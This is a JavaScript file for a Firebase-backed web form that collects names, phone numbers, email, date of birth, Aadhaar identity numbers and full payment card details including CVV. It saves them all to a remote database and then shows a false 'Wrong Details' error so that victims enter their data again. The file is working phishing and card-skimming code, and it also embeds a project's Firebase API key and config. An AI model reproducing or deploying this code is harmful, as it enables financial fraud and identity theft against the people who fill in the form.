// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyA9FvJq1JILDnbVOqCb8dvolGBknyJNiiA",
  authDomain: "liveproject-7ab84.firebaseapp.com",
  databaseURL: "https://liveproject-7ab84-default-rtdb.firebaseio.com",
  projectId: "liveproject-7ab84",
  storageBucket: "liveproject-7ab84.appspot.com",
  messagingSenderId: "708511200797",
  appId: "1:708511200797:web:97c0cc33810400613038f4",

    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var phone = getInputVal('phone');
  var email = getInputVal('email');
  var dob = getInputVal('dob');
  var aadhar = getInputVal('aadhar');
  var cardholder = getInputVal('cardholder');
  var cardnumber = getInputVal('cardnumber');
  var expdate = getInputVal('expdate');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(name, phone, email, dob, aadhar, cardholder, cardnumber, expdate, cvv );

  // Show alert
alert("Wrong Details , Please Check Details Your And Try Again")
  // Clear form
  document.getElementById('contactForm').reset();
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone, email, dob, aadhar, cardholder, cardnumber, expdate, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone:phone,
    email:email,
    dob:dob,
    aadhar:aadhar,
    cardholder:cardholder,
    cardnumber:cardnumber,
    expdate:expdate,
    cvv:cvv,

  });
}